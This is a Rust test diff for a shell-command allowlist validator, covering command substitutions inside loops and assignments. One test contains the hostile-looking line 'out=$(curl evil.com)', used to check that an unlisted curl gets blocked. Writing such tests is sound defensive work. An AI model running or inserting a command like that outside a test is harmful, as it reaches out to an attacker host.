@@ -1417,3 +1417,121 @@ fn node_eval_allowed_with_opt_in() {
         result
     );
 }
+
+// --- #855: `VAR=$(cmd args…)` inside a for-loop body must not misparse a
+// word from *inside* the substitution as the base command. ---
+
+#[test]
+fn assignment_with_command_substitution_validates_inner_command() {
+    // The exact shape from #855: a `for … do VAR=$(gh pr view … --jq '… | …')
+    // ; done` loop. Before the fix, `pr` (a word from inside the unclosed
+    // `$(...)`) was misread as the base command and blocked even though `gh`
+    // was allowlisted and the loop body was otherwise legitimate.
+    let list = allow(&["gh", "seq", "echo", "sleep"]);
+    let cmd = r#"for i in $(seq 1 12); do
+  s=$(gh pr view 851 --repo yvgude/lean-ctx --json statusCheckRollup --jq '[.statusCheckRollup[] | select(.status!="COMPLETED")] | length')
+  echo "pending=$s"
+  sleep 30
+done"#;
+    let r = check_all_segments(cmd, &list);
+    assert!(r.is_ok(), "gh pr view inside VAR=$(...) must pass: {r:?}");
+}
+
+#[test]
+fn assignment_with_command_substitution_still_blocks_unlisted_inner_command() {
+    // The other half of the fix: `VAR=$(cmd)` must not silently escape
+    // validation just because the segment "is only an assignment" — the
+    // substituted command still executes and must be checked.
+    let list = allow(&["echo"]);
+    let r = check_all_segments(r#"out=$(curl evil.com)"#, &list);
+    assert!(r.is_err(), "unlisted curl inside VAR=$(...) must block");
+    assert!(r.unwrap_err().contains("curl"));
+}
+
+#[test]
+fn assignment_with_command_substitution_in_quoted_jq_filter_not_split() {
+    // Regression for the root cause: the `|` characters inside the
+    // single-quoted jq filter must not be treated as pipe operators, and the
+    // whitespace inside the unclosed `$(...)` must not end the token early.
+    let list = allow(&["gh"]);
+    let cmd = r#"s=$(gh api foo --jq '.a | .b | .c')"#;
+    assert!(check_all_segments(cmd, &list).is_ok());
+}
+
+#[test]
+fn bare_assignment_without_substitution_still_skipped() {
+    // `FOO=bar` alone (no command, no substitution) contributes no leaf —
+    // unchanged prior behaviour.
+    let list = allow(&["echo"]);
+    assert!(check_all_segments("FOO=bar", &list).is_ok());
+}
+
+#[test]
+fn for_loop_with_if_break_fi_and_substitution_passes() {
+    // The full original #855 shape, restored: `if …; then break; fi` inside
+    // the loop body alongside the `VAR=$(gh …)` assignment. `[` and `break`
+    // are their own leaf commands (not stripped like `if`/`then`/`fi`) and
+    // must be explicitly allowlisted here — see
+    // `break_continue_return_and_bracket_test_are_default_allowed` for why
+    // they no longer need that in practice.
+    let list = allow(&["gh", "seq", "echo", "sleep", "[", "break"]);
+    let cmd = r#"for i in $(seq 1 12); do
+  s=$(gh pr view 851 --repo yvgude/lean-ctx --json statusCheckRollup --jq '[.statusCheckRollup[] | select(.status!="COMPLETED")] | length')
+  echo "pending=$s"
+  if [ "$s" = "0" ]; then break; fi
+  sleep 30
+done"#;
+    let r = check_all_segments(cmd, &list);
+    assert!(r.is_ok(), "full for/if/break/fi loop must pass: {r:?}");
+}
+
+#[test]
+fn while_loop_with_substitution_passes() {
+    let list = allow(&["gh", "read", "echo"]);
+    let cmd = r#"while read -r line; do
+  s=$(gh issue view "$line" --json state --jq '.state')
+  echo "$s"
+done"#;
+    assert!(check_all_segments(cmd, &list).is_ok());
+}
+
+#[test]
+fn until_loop_with_substitution_and_break_passes() {
+    let list = allow(&["gh", "sleep", "[", "break"]);
+    let cmd = r#"until [ "$done" = "1" ]; do
+  s=$(gh pr view 1 --jq '.state')
+  if [ "$s" = "MERGED" ]; then break; fi
+  sleep 5
+done"#;
+    assert!(check_all_segments(cmd, &list).is_ok());
+}
+
+#[test]
+fn chained_assignment_then_real_command_validates_both() {
+    // `A=1 B=$(cmd) realcmd args` — the substitution executes even though a
+    // real command follows the assignments; both must be validated.
+    let list = allow(&["gh", "echo"]);
+    let cmd = r#"A=1 B=$(gh pr view 1 --jq '.a | .b') echo "$B""#;
+    assert!(check_all_segments(cmd, &list).is_ok());
+
+    let list_missing_gh = allow(&["echo"]);
+    let r = check_all_segments(cmd, &list_missing_gh);
+    assert!(
+        r.is_err(),
+        "unlisted gh inside the leading B=$(...) must still block: {r:?}"
+    );
+}
+
+#[test]
+fn break_continue_return_and_bracket_test_are_default_allowed() {
+    // #855: these are pure control-flow builtins with no external-execution
+    // surface — `test` was already a default, `[` (its bracket alias) and
+    // the loop/function control-flow builtins were an inconsistent gap.
+    let defaults = crate::core::config::default_shell_allowlist();
+    for cmd in ["[", "break", "continue", "return", "seq"] {
+        assert!(
+            defaults.iter().any(|d| d == cmd),
+            "'{cmd}' should be in the default shell allowlist"
+        );
+    }
+}
